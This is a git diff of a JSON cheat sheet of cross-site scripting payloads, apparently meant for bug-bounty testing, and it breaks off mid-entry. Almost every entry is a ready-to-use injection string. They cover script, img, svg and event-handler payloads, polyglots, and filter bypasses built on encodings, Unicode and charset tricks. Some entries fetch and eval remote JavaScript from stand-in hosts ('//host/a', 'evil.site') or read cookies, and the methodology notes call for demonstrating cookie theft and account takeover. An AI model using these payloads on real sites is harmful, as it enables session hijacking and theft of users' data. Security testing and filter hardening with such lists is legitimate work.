@@ -6,28 +6,42 @@
       "subcategory": "Methodology",
       "title": "Types of XSS",
       "language": "text",
-      "tags": ["methodology", "xss"],
+      "tags": [
+        "methodology",
+        "xss"
+      ],
       "body": "Reflected XSS - the code arrives in a link/parameter and executes in the victim's browser on click (not stored on the server).\nStored XSS - the code is saved on the server (comment, profile) and executes for everyone who opens the page.\nDOM-based XSS - vulnerable JS modifies the DOM based on input; the payload never reaches the server, it executes directly in the browser - harder to detect."
     },
     {
       "subcategory": "Methodology",
       "title": "Where to look for XSS and how to report it",
       "language": "text",
-      "tags": ["methodology", "recon", "poc"],
+      "tags": [
+        "methodology",
+        "recon",
+        "poc"
+      ],
       "body": "Any input that later gets rendered back to the user: search, name/profile, comments, contact forms, tickets.\nThe Referer and User-Agent headers often end up in admin-panel logs and custom analytics (fertile ground for blind XSS).\nFor a strong PoC don't stop at alert(): demonstrate real impact - cookie/token theft, PII, session hijacking, account takeover."
     },
     {
       "subcategory": "Methodology",
       "title": "Don't use alert(1) - go with document.domain / origin",
       "language": "html",
-      "tags": ["methodology", "poc"],
+      "tags": [
+        "methodology",
+        "poc"
+      ],
       "body": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>"
     },
     {
       "subcategory": "Methodology",
       "title": "console.log instead of alert for Stored XSS",
       "language": "html",
-      "tags": ["methodology", "poc", "stored"],
+      "tags": [
+        "methodology",
+        "poc",
+        "stored"
+      ],
       "body": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
       "meta": "alert() has to be dismissed on every trigger - for Stored XSS that's painful; console.log writes to the console without interaction."
     },
@@ -35,7 +49,10 @@
       "subcategory": "Methodology",
       "title": "Open the debugger instead of alert",
       "language": "javascript",
-      "tags": ["methodology", "detection"],
+      "tags": [
+        "methodology",
+        "detection"
+      ],
       "body": "<script>debugger;</script>",
       "meta": "Opens the debugger in the developer console instead of a pop-up alert."
     },
@@ -43,15 +60,19 @@
       "subcategory": "Methodology",
       "title": "Tools for detecting XSS",
       "language": "text",
-      "tags": ["tools"],
+      "tags": [
+        "tools"
+      ],
       "body": "XSStrike - popular, but poorly maintained.\nxsser - uses a headless browser.\nDalfox - many features, very fast (Go).\nXSpear - a Ruby equivalent of Dalfox.\ndomdig - a DOM XSS tester on headless Chrome.\nMost of these tools are also suitable for blind XSS."
     },
-
     {
       "subcategory": "Basic HTML",
       "title": "Basic payloads (script)",
       "language": "html",
-      "tags": ["basic", "script"],
+      "tags": [
+        "basic",
+        "script"
+      ],
       "body": "<script>alert('XSS')</script>\n<scr<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>\n\"><script>alert(String.fromCharCode(88,83,83))</script>\n<script>\\u0061lert('22')</script>\n<script>eval('\\x61lert(\\'33\\')')</script>\n<script>eval(8680439..toString(30))(983801..toString(36))</script>\n<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
       "meta": "8680439..toString(30) === \"alert\", 983801..toString(36) === \"l33t\" — building the function name from numbers to bypass a name filter."
     },
@@ -59,7 +80,11 @@
       "subcategory": "Basic HTML",
       "title": "img onerror",
       "language": "html",
-      "tags": ["basic", "img", "onerror"],
+      "tags": [
+        "basic",
+        "img",
+        "onerror"
+      ],
       "body": "<img src=x onerror=alert('XSS');>\n<img src=x onerror=alert('XSS')//\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>\n<img src=x:alert(alt) onerror=eval(src) alt=xss>\n\"><img src=x onerror=alert('XSS');>\n\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<><img src=1 onerror=alert(1)>",
       "meta": "oneonerrorrror - if the filter strips the string \"onerror\" once, a valid onerror remains after stripping."
     },
@@ -67,7 +92,11 @@
       "subcategory": "Basic HTML",
       "title": "svg onload",
       "language": "html",
-      "tags": ["basic", "svg", "onload"],
+      "tags": [
+        "basic",
+        "svg",
+        "onload"
+      ],
       "body": "<svgonload=alert(1)>\n<svg/onload=alert('XSS')>\n<svg onload=alert(1)//\n<svg/onload=alert(String.fromCharCode(88,83,83))>\n<svg id=alert(1) onload=eval(id)>\n\"><svg/onload=alert(String.fromCharCode(88,83,83))>\n\"><svg/onload=alert(/XSS/)\n<svg><script href=data:,alert(1) />\n<svg><script>alert('33')\n<svg><script>alert&lpar;'33'&rpar;",
       "meta": "<script href=data:,alert(1) /> (self-closing script) works only in Firefox."
     },
@@ -75,21 +104,33 @@
       "subcategory": "Basic HTML",
       "title": "div pointer events",
       "language": "html",
-      "tags": ["basic", "div", "events"],
+      "tags": [
+        "basic",
+        "div",
+        "events"
+      ],
       "body": "<div onpointerover=\"alert(45)\">MOVE HERE</div>\n<div onpointerdown=\"alert(45)\">MOVE HERE</div>\n<div onpointerenter=\"alert(45)\">MOVE HERE</div>\n<div onpointerleave=\"alert(45)\">MOVE HERE</div>\n<div onpointermove=\"alert(45)\">MOVE HERE</div>\n<div onpointerout=\"alert(45)\">MOVE HERE</div>\n<div onpointerup=\"alert(45)\">MOVE HERE</div>"
     },
     {
       "subcategory": "Basic HTML",
       "title": "HTML5 tags with auto-trigger",
       "language": "html",
-      "tags": ["html5", "autofocus", "events"],
+      "tags": [
+        "html5",
+        "autofocus",
+        "events"
+      ],
       "body": "<body onload=alert(/XSS/.source)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<textarea autofocus onfocus=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<video/poster/onerror=alert(1)>\n<video><source onerror=\"javascript:alert(1)\">\n<video src=_ onloadstart=\"alert(1)\">\n<details/open/ontoggle=\"alert`1`\">\n<audio src onloadstart=alert(1)>\n<marquee onstart=alert(1)>\n<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>"
     },
     {
       "subcategory": "Basic HTML",
       "title": "HTML5 touch events (mobile)",
       "language": "html",
-      "tags": ["html5", "touch", "mobile"],
+      "tags": [
+        "html5",
+        "touch",
+        "mobile"
+      ],
       "body": "<body ontouchstart=alert(1)>\n<body ontouchend=alert(1)>\n<body ontouchmove=alert(1)>",
       "meta": "ontouchstart - finger touches the screen; ontouchend - finger lifted; ontouchmove - finger moves across the screen."
     },
@@ -97,7 +138,10 @@
       "subcategory": "Basic HTML",
       "title": "Loading remote JS",
       "language": "html",
-      "tags": ["remote-js", "script"],
+      "tags": [
+        "remote-js",
+        "script"
+      ],
       "body": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>\n<script src=14.rs>",
       "meta": "14.rs - a short JS hosting service; you can set an arbitrary payload via 14.rs/#alert(document.domain)."
     },
@@ -105,7 +149,11 @@
       "subcategory": "Context: attribute / hidden",
       "title": "XSS in a hidden input (accesskey)",
       "language": "html",
-      "tags": ["hidden", "accesskey", "attribute"],
+      "tags": [
+        "hidden",
+        "accesskey",
+        "attribute"
+      ],
       "body": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
       "meta": "Triggers via CTRL+SHIFT+X (the accesskey combination)."
     },
@@ -113,7 +161,10 @@
       "subcategory": "Context: attribute / hidden",
       "title": "XSS in a hidden input (newer browsers)",
       "language": "html",
-      "tags": ["hidden", "attribute"],
+      "tags": [
+        "hidden",
+        "attribute"
+      ],
       "body": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
       "meta": "Works in newer browsers: firefox-130 / chrome-108."
     },
@@ -121,7 +172,11 @@
       "subcategory": "Context: attribute / hidden",
       "title": "XSS in output forced to UPPERCASE",
       "language": "html",
-      "tags": ["uppercase", "html-entities", "bypass"],
+      "tags": [
+        "uppercase",
+        "html-entities",
+        "bypass"
+      ],
       "body": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
       "meta": "If the page forces input to UPPERCASE - HTML entities are decoded after the case conversion, so alert stays lowercase."
     },
@@ -129,7 +184,10 @@
       "subcategory": "Context: JS",
       "title": "XSS in a JS context (no quotes)",
       "language": "javascript",
-      "tags": ["js-context", "no-quotes"],
+      "tags": [
+        "js-context",
+        "no-quotes"
+      ],
       "body": "-(confirm)(document.domain)//\n; alert(1);//",
       "meta": "Payload without single/double quotes, from @brutelogic. Suitable when input is placed inside a JS string/expression."
     },
@@ -137,7 +195,10 @@
       "subcategory": "Context: JS",
       "title": "Breaking out of a JS string inside <script>",
       "language": "html",
-      "tags": ["js-context", "script-breakout"],
+      "tags": [
+        "js-context",
+        "script-breakout"
+      ],
       "body": "<script>\nfoo=\"text </script><script>alert(1)</script>\";\n</script>",
       "meta": "The HTML parser closes <script> at the literal </script> even inside a JS string - use this to break the string and open a new script."
     },
@@ -145,23 +206,32 @@
       "subcategory": "DOM-based",
       "title": "DOM-based XSS (via a DOM sink)",
       "language": "javascript",
-      "tags": ["dom", "sink"],
+      "tags": [
+        "dom",
+        "sink"
+      ],
       "body": "#\"><img src=/ onerror=alert(2)>",
       "meta": "Via location.hash / another DOM source that reaches a dangerous sink (innerHTML, etc.)."
     },
-
     {
       "subcategory": "URI wrappers",
       "title": "Wrapper javascript:",
       "language": "javascript",
-      "tags": ["uri", "javascript-scheme"],
+      "tags": [
+        "uri",
+        "javascript-scheme"
+      ],
       "body": "javascript:prompt(1)\n\n%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341\n\n&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41"
     },
     {
       "subcategory": "URI wrappers",
       "title": "javascript: - Hex / Octal / Unicode encoding",
       "language": "javascript",
-      "tags": ["uri", "javascript-scheme", "encoding"],
+      "tags": [
+        "uri",
+        "javascript-scheme",
+        "encoding"
+      ],
       "body": "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
       "meta": "Encode the string \"javascript:\" in Hex / Unicode / Octal."
     },
@@ -169,7 +239,11 @@
       "subcategory": "URI wrappers",
       "title": "javascript: - newline / tab / escape / comment",
       "language": "javascript",
-      "tags": ["uri", "javascript-scheme", "bypass"],
+      "tags": [
+        "uri",
+        "javascript-scheme",
+        "bypass"
+      ],
       "body": "java%0ascript:alert(1)\njava%09script:alert(1)\njava%0dscript:alert(1)\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\njavascript://%0Aalert(1)\njavascript://anything%0D%0A%0D%0Awindow.alert(1)",
       "meta": "%0a=LF, %09=tab, %0d=CR - the line-break characters inside \"java...script:\" are ignored. Also escaping \\j\\a... and the \"// + line break\" trick."
     },
@@ -177,7 +251,11 @@
       "subcategory": "URI wrappers",
       "title": "How the browser parses the javascript: protocol (scheme)",
       "language": "image",
-      "tags": ["uri", "javascript-scheme", "dom"],
+      "tags": [
+        "uri",
+        "javascript-scheme",
+        "dom"
+      ],
       "body": "",
       "meta": {
         "kind": "image",
@@ -189,7 +267,10 @@
       "subcategory": "URI wrappers",
       "title": "Wrapper data:",
       "language": "html",
-      "tags": ["uri", "data-scheme"],
+      "tags": [
+        "uri",
+        "data-scheme"
+      ],
       "body": "data:text/html,<script>alert(0)</script>\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\n<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
       "meta": "base64 PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ = <svg/onload=alert(2)>; YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== = alert(document.domain)."
     },
@@ -197,15 +278,21 @@
       "subcategory": "URI wrappers",
       "title": "Wrapper vbscript: (IE only)",
       "language": "html",
-      "tags": ["uri", "vbscript", "ie"],
+      "tags": [
+        "uri",
+        "vbscript",
+        "ie"
+      ],
       "body": "vbscript:msgbox(\"XSS\")"
     },
-
     {
       "subcategory": "Polyglots",
       "title": "Polyglot 0xsobky (Ultimate XSS Polyglot)",
       "language": "text",
-      "tags": ["polyglot", "famous"],
+      "tags": [
+        "polyglot",
+        "famous"
+      ],
       "body": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
       "meta": "The best-known polyglot: works in HTML, attributes, JS, and in style/title/textarea/script contexts."
     },
@@ -213,43 +300,57 @@
       "subcategory": "Polyglots",
       "title": "Polyglot brutelogic",
       "language": "text",
-      "tags": ["polyglot"],
+      "tags": [
+        "polyglot"
+      ],
       "body": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->"
     },
     {
       "subcategory": "Polyglots",
       "title": "Polyglot Rsnake / Daniel Miessler",
       "language": "text",
-      "tags": ["polyglot", "classic"],
+      "tags": [
+        "polyglot",
+        "classic"
+      ],
       "body": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
     },
     {
       "subcategory": "Polyglots",
       "title": "Polyglot Ashar Javed",
       "language": "text",
-      "tags": ["polyglot"],
+      "tags": [
+        "polyglot"
+      ],
       "body": "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">"
     },
     {
       "subcategory": "Polyglots",
       "title": "Polyglot s0md3v (svg + confirm)",
       "language": "text",
-      "tags": ["polyglot"],
+      "tags": [
+        "polyglot"
+      ],
       "body": "-->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``>"
     },
     {
       "subcategory": "Polyglots",
       "title": "Polyglots filedescriptor (Polyglot Challenge)",
       "language": "text",
-      "tags": ["polyglot", "challenge"],
+      "tags": [
+        "polyglot",
+        "challenge"
+      ],
       "body": "// Author: crlf\njavascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>\n\n// Author: europa\njavascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>\n\n// Author: EdOverflow\njavascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>\n\n// Author: h1/ragnar\njavascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`"
     },
-
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing a case-sensitive filter",
       "language": "html",
-      "tags": ["filter-bypass", "case"],
+      "tags": [
+        "filter-bypass",
+        "case"
+      ],
       "body": "<sCrIpt>alert(1)</ScRipt>\n<ScrIPt>alert(1)</ScRipT>",
       "meta": "Many filters catch only the exact lowercase/uppercase pattern - mixed case bypasses them."
     },
@@ -257,21 +358,31 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing a tag blacklist (nesting)",
       "language": "html",
-      "tags": ["filter-bypass", "tag-blacklist"],
+      "tags": [
+        "filter-bypass",
+        "tag-blacklist"
+      ],
       "body": "<script x>\n<script x>alert('XSS')<script y>"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing a word blacklist via eval",
       "language": "javascript",
-      "tags": ["filter-bypass", "eval", "word-blacklist"],
+      "tags": [
+        "filter-bypass",
+        "eval",
+        "word-blacklist"
+      ],
       "body": "eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing via an unclosed / incomplete HTML tag",
       "language": "html",
-      "tags": ["filter-bypass", "incomplete-tag"],
+      "tags": [
+        "filter-bypass",
+        "incomplete-tag"
+      ],
       "body": "<img src='1' onerror='alert(0)' <",
       "meta": "Works in IE/Firefox/Chrome/Safari - the browser completes the tag."
     },
@@ -279,14 +390,20 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing without quotes (String.fromCharCode)",
       "language": "javascript",
-      "tags": ["filter-bypass", "no-quotes"],
+      "tags": [
+        "filter-bypass",
+        "no-quotes"
+      ],
       "body": "String.fromCharCode(88,83,83)"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing a dot (.) filter",
       "language": "html",
-      "tags": ["filter-bypass", "dot"],
+      "tags": [
+        "filter-bypass",
+        "dot"
+      ],
       "body": "<script>window['alert'](document['domain'])</script>\n<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script>",
       "meta": "Bracket notation instead of the dot. atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\") = alert(document.cookie). IP in decimal form: http://192.168.1.1 == http://3232235777."
     },
@@ -294,14 +411,20 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing without parentheses (string)",
       "language": "javascript",
-      "tags": ["filter-bypass", "no-parenthesis"],
+      "tags": [
+        "filter-bypass",
+        "no-parenthesis"
+      ],
       "body": "alert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing without parentheses and semicolons (throw onerror)",
       "language": "html",
-      "tags": ["filter-bypass", "no-parenthesis"],
+      "tags": [
+        "filter-bypass",
+        "no-parenthesis"
+      ],
       "body": "<script>onerror=alert;throw 1337</script>\n<script>{onerror=alert}throw 1337</script>\n<script>throw onerror=alert,'some string',123,'haha'</script>\n<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>\n<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>",
       "meta": "From @garethheyes, @terjanq, @cgvwzq. onerror=alert + throw calls alert with the exception as its argument."
     },
@@ -309,7 +432,10 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing an onxxxx= blacklist",
       "language": "html",
-      "tags": ["filter-bypass", "event-handler"],
+      "tags": [
+        "filter-bypass",
+        "event-handler"
+      ],
       "body": "<object onafterscriptexecute=confirm(0)>\n<object onbeforescriptexecute=confirm(0)>\n<img src='1' onerror\\x00=alert(0) />\n<img src='1' onerror\\x0b=alert(0) />\n<img src='1' onerror\\x0d=alert(0) />\n<img src='1' onerror\\x0a=alert(0) />\n<img src='1' onerror/=alert(0) />",
       "meta": "Little-known on*scriptexecute handlers; inserting null/vtab/CR/LF/'/' between onerror and '='."
     },
@@ -317,7 +443,10 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing a space filter",
       "language": "html",
-      "tags": ["filter-bypass", "space"],
+      "tags": [
+        "filter-bypass",
+        "space"
+      ],
       "body": "<img/src='1'/onerror=alert(0)>\n<svgonload=alert(1)>",
       "meta": "A slash instead of a space; or the separators 0x0c/0x0d/0x0a/0x09. Example (0x0c between tokens): <svg^Lonload^L=^Lalert(1)^L> where ^L = 0x0c."
     },
@@ -325,7 +454,11 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via the Email format (RFC)",
       "language": "html",
-      "tags": ["filter-bypass", "email", "rfc"],
+      "tags": [
+        "filter-bypass",
+        "email",
+        "rfc"
+      ],
       "body": "\"><svg/onload=confirm(1)>\"@x.y\nxss@example.com(<img src='x' onerror='alert(document.location)'>)",
       "meta": "The first is an RFC0822-valid address; the second is RFC5322 (a comment in parentheses)."
     },
@@ -333,7 +466,11 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via a Tel URI (;phone-context=)",
       "language": "html",
-      "tags": ["filter-bypass", "tel-uri", "rfc"],
+      "tags": [
+        "filter-bypass",
+        "tel-uri",
+        "rfc"
+      ],
       "body": "+330011223344;phone-context=<script>alert(0)</script>",
       "meta": "The ;phone-context= descriptor is mentioned in RFC3966 and RFC2806."
     },
@@ -341,14 +478,20 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing a document blacklist",
       "language": "javascript",
-      "tags": ["filter-bypass", "document"],
+      "tags": [
+        "filter-bypass",
+        "document"
+      ],
       "body": "<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>\nwindow[\"doc\"+\"ument\"]"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing a document.cookie blacklist (cookieStore)",
       "language": "javascript",
-      "tags": ["filter-bypass", "cookie"],
+      "tags": [
+        "filter-bypass",
+        "cookie"
+      ],
       "body": "window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});",
       "meta": "Accessing cookies in Chrome/Edge/Opera via the cookieStore API. Replace COOKIE NAME; there is also a getAll() method."
     },
@@ -356,14 +499,20 @@
       "subcategory": "Filter bypass",
       "title": "Alternative redirect methods",
       "language": "javascript",
-      "tags": ["filter-bypass", "redirect"],
+      "tags": [
+        "filter-bypass",
+        "redirect"
+      ],
       "body": "location=\"http://google.com\"\ndocument.location = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\nwindow['location']['href']=\"http://google.com\""
     },
     {
       "subcategory": "Filter bypass",
       "title": "Alternative ways to call alert",
       "language": "javascript",
-      "tags": ["filter-bypass", "alert"],
+      "tags": [
+        "filter-bypass",
+        "alert"
+      ],
       "body": "window['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\nframes['alert'](5)\ncontent['alert'](6)\n\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n[12].forEach(alert);",
       "meta": "From @brutelogic - calling alert through a carrier object or through array methods (callback)."
     },
@@ -371,7 +520,11 @@
       "subcategory": "Filter bypass",
       "title": "Alternative alert via constructor / global vars",
       "language": "javascript",
-      "tags": ["filter-bypass", "alert", "constructor"],
+      "tags": [
+        "filter-bypass",
+        "alert",
+        "constructor"
+      ],
       "body": "constructor.constructor(\"aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\ntop[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\nprompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\rscript:alert(1)'",
       "meta": "From @404death and @quanyang. Accessing alert via an index of the global object: self[Object.keys(self)[5]](\"1\")."
     },
@@ -379,7 +532,10 @@
       "subcategory": "Filter bypass",
       "title": "Don't close the tag '>'",
       "language": "html",
-      "tags": ["filter-bypass", "no-close"],
+      "tags": [
+        "filter-bypass",
+        "no-close"
+      ],
       "body": "<svg onload=alert(1)//",
       "meta": "Closing the tag is not required - the browser will complete it itself."
     },
@@ -387,7 +543,11 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing '<' and '>' via ＜ ＞ (fullwidth)",
       "language": "html",
-      "tags": ["filter-bypass", "unicode", "fullwidth"],
+      "tags": [
+        "filter-bypass",
+        "unicode",
+        "fullwidth"
+      ],
       "body": "＜script/src=//evil.site/poc.js＞",
       "meta": "The characters U+FF1C and U+FF1E. On normalization/conversion they are replaced with < and >."
     },
@@ -395,7 +555,10 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing ';' with another operator character",
       "language": "javascript",
-      "tags": ["filter-bypass", "semicolon"],
+      "tags": [
+        "filter-bypass",
+        "semicolon"
+      ],
       "body": "'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' > alert('>') > 'xt';\n'te' < alert('<') < 'xt';\n'te' == alert('==') == 'xt';\n'te' & alert('&') & 'xt';\n'te' , alert(',') , 'xt';\n'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof') instanceof 'xt';",
       "meta": "If ';' is filtered - any binary operator can separate the expression."
     },
@@ -403,14 +566,21 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via HTML entities",
       "language": "javascript",
-      "tags": ["filter-bypass", "html-entities", "encoding"],
+      "tags": [
+        "filter-bypass",
+        "html-entities",
+        "encoding"
+      ],
       "body": "%26%2397;lert(1)\n&#97;&#108;&#101;&#114;&#116;\n></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing via ECMAScript6 (DiacriticalGrave)",
       "language": "html",
-      "tags": ["filter-bypass", "es6"],
+      "tags": [
+        "filter-bypass",
+        "es6"
+      ],
       "body": "<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>",
       "meta": "&DiacriticalGrave; decodes to a backtick ` -> alert`1`."
     },
@@ -418,14 +588,22 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via Octal encoding",
       "language": "javascript",
-      "tags": ["filter-bypass", "octal", "encoding"],
+      "tags": [
+        "filter-bypass",
+        "octal",
+        "encoding"
+      ],
       "body": "javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing via Unicode escape",
       "language": "html",
-      "tags": ["filter-bypass", "unicode", "encoding"],
+      "tags": [
+        "filter-bypass",
+        "unicode",
+        "encoding"
+      ],
       "body": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
       "meta": "\\u0061\\u006C\\u0065\\u0072\\u0074 = a l e r t. JS identifiers can be written with Unicode escapes."
     },
@@ -433,7 +611,10 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via Unicode characters (fullwidth/modifier/case)",
       "language": "text",
-      "tags": ["filter-bypass", "unicode"],
+      "tags": [
+        "filter-bypass",
+        "unicode"
+      ],
       "body": "ʺ＞＜svg onload=alert(/XSS/)＞/\n%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n<ſvg onload=... >\n<ıframe id=x onload=>",
       "meta": "\\uFF1C/\\uFF1E -> </>; \\u02BA/\\u02B9 -> \"/'. The characters ſ (U+017F) and ı (U+0131) turn into s/i after toUpperCase/toLowerCase and make the tags valid."
     },
@@ -441,21 +622,33 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via UTF-7",
       "language": "text",
-      "tags": ["filter-bypass", "utf-7", "charset"],
+      "tags": [
+        "filter-bypass",
+        "utf-7",
+        "charset"
+      ],
       "body": "+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing via UTF-8 overlong / modifier",
       "language": "text",
-      "tags": ["filter-bypass", "utf-8", "charset"],
+      "tags": [
+        "filter-bypass",
+        "utf-8",
+        "charset"
+      ],
       "body": "< = %C0%BC = %E0%80%BC = %F0%80%80%BC\n> = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9"
     },
     {
       "subcategory": "Filter bypass",
       "title": "Bypassing via UTF-16be / UTF-32 / BOM",
       "language": "text",
-      "tags": ["filter-bypass", "charset", "bom"],
+      "tags": [
+        "filter-bypass",
+        "charset",
+        "bom"
+      ],
       "body": "UTF-16be:\n%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\nUTF-16 BOM (Little Endian 0xFF 0xFE, the page must start with the BOM):\n%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E",
       "meta": "Requires the absence of charset in Content-Type. The BOM lets you override the page encoding; the page must start with the BOM character."
     },
@@ -463,7 +656,11 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via absence of charset (ISO-2022-JP)",
       "language": "text",
-      "tags": ["filter-bypass", "charset", "iso-2022-jp"],
+      "tags": [
+        "filter-bypass",
+        "charset",
+        "iso-2022-jp"
+      ],
       "body": "search=%1b(J&lang=en\";alert(1)//",
       "meta": "Requirement: there is no charset in Content-Type (text/html). ISO-2022-JP: %1b(J switches to JIS X 0201 1976, where 0x5c '\\' becomes '¥', removing the escaping of the quote \\' -> ¥'."
     },
@@ -471,7 +668,11 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via exotic alphabets (Katakana / Cuneiform / Lontara)",
       "language": "javascript",
